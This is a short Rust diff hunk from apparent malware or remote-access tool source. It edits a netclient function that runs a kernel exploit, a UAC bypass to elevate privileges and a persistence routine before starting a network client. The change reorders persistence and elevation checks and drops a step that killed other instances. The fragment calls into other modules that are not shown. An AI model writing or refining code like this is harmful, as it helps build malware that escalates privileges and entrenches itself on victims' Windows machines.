@@ -274,13 +274,11 @@ pub async fn netclient() -> Result<()> {
             kernel_exploit::exploit();
         }
         uac_bypass::elevate_uac(&exe_str);
-
-        sleep(Duration::from_secs(61)).await;
         return Ok(());
-    } else {
-        kill_other_instances();
-        persist::persist();
+    } 
+    persist::persist()?;
+    if !is_elevated(){
+        sleep(Duration::from_secs(61)).await;
     }
-
     netclient_run(ClientConfig::default()).await
 }
